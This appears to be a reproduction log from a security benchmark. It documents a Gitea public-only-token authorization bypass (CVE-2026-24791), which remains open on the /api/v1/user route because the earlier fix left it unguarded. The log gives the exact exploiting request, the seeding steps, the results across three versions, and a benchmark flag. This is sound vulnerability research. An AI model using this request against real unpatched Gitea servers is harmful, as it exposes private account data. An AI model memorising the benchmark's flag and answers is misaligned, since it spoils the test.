# gitea-cve-2026-24791 — reproduction log (CVE-2025-68941 -> CVE-2026-24791)
# REAL published Gitea, external HTTP trigger. NO source lift, NO harness.

## Relationship verdict: VALID incomplete fix / bypass
Gitea public-only-token authorization bypass (CWE-863).
- CVE-2025-68941 (fixed v1.22.3; feature PR #32204, backport #32218): introduced
  checkTokenPublicOnly() and wired it onto the PUBLIC-FACING /api/v1/users/{username} route
  group (ContextUser = target user via UserAssignmentAPI).
- CVE-2026-24791 (advisory GHSA-wrr5-99h5-gq57; fixed v1.26.2): the SAME guard was never wired
  onto the /api/v1/user SELF-route family. Advisory verbatim: "this should be treated as an
  incomplete fix / residual gap in a different route family, not as a duplicate of the older
  advisory." Fix = add contextAuthenticatedUser()+checkTokenPublicOnly() to the /user group
  (+rejectPublicOnly() on sensitive sub-routes).

## Source verification (real Gitea, routers/api/v1/api.go)
- v1.26.1  /users/{username} closing chain: ..., context.UserAssignmentAPI(), checkTokenPublicOnly(), ...
           /user (self) closing chain:      }, tokenRequiresScopes(...User), reqToken())          <- NO guard
- v1.26.2  /user (self) closing chain:      }, tokenRequiresScopes(...User), reqToken(), contextAuthenticatedUser(), checkTokenPublicOnly())  <- guard ADDED
- "public-only" is a real Gitea access-token scope (models/auth/access_token_scope.go:
  AccessTokenScopePublicOnly = "public-only"); PublicOnly() derives ctx.PublicOnly from it.

## REAL environment (official images, one container per version)
  v0 = gitea/gitea:1.22.2  ->  http://127.0.0.1:39370   (< 1.22.3: no checkTokenPublicOnly)
  v1 = gitea/gitea:1.26.1  ->  http://127.0.0.1:39371   (guard on /users/{username}; /user UNGUARDED = target)
  v2 = gitea/gitea:1.26.2  ->  http://127.0.0.1:39372   (guard also on /user = residual fixed)
  SQLite, INSTALL_LOCK=true; all seeding done through the real Gitea CLI + REST API (seed.sh).

## Seed (per instance, real Gitea interfaces only — seed.sh)
  1. gitea admin user create  (site admin, run --user git)
  2. POST /api/v1/admin/users  -> PRIVATE account "alice" (visibility=private), email=${PCB_FLAG}@pcb.local
  3. POST /api/v1/users/alice/tokens (basic auth alice) -> token scoped ["public-only","read:user"]
  The generated token value is per-instance; oracle.py resolves the symbolic
  "alice-public-only-token" to PCB_TOKEN_{V0,V1,V2} exported by run_gate.sh.

## Attack channel (same sink family — Variant A), all EXTERNAL HTTP
  Authorization: token <alice's real public-only,read:user token>
  seed     (CVE-2025-68941): GET /api/v1/users/alice   (public-facing by-username, ContextUser=alice)
  residual (CVE-2026-24791): GET /api/v1/user           (self route, Doer=alice)
  Observable = returned user JSON; flag present iff the public-only token read alice's private email.

## Observed (real Gitea, clean run; FLAG=PCBFLAG_a1900dbf141f9ef5b423c9382a86a508)
  v0 (39370) SEED /api/v1/users/alice : HTTP 200 FLAG-HIT   <- no guard, private account leaks
  v0 (39370) SELF /api/v1/user        : HTTP 200 FLAG-HIT
  v1 (39371) SEED /api/v1/users/alice : HTTP 403 no-flag    <- seed BLOCKED (checkTokenPublicOnly, "token scope is limited to public users")
  v1 (39371) SELF /api/v1/user        : HTTP 200 FLAG-HIT   <- RESIDUAL CONFIRMED: self route unguarded on v1
  v2 (39372) SEED /api/v1/users/alice : HTTP 403 no-flag    <- blocked
  v2 (39372) SELF /api/v1/user        : HTTP 403 no-flag    <- residual fixed (guard wired onto /user)

## Build-time gate (benchmark/flag_oracle.validate_case via `python3 oracle.py --gate`)
  original_poc_reaches_flag_on_v0 : true
  original_poc_blocked_on_v1      : true
  bypass_poc_reaches_flag_on_v1   : true
  passed                          : true
  (extra) bypass_poc_blocked_on_v2 : true   (v2 SELF -> HTTP 403, no flag)

## Reproduce
  ./run_gate.sh          # boots the 3 real Gitea versions, seeds via CLI+REST, runs the gate

## Teardown
  docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all && docker image prune -f

## STALE files (superseded by the real-app rebuild; retained, NOT deleted per no-rm policy)
  harness.go, go.mod, Dockerfile  -- the OLD stdlib harness that lifted checkTokenPublicOnly() +
  route wiring verbatim from routers/api/v1/api.go and did NOT boot real Gitea. No longer built or
  referenced by docker-compose.yml (now uses official gitea/gitea images). Kept as a record.
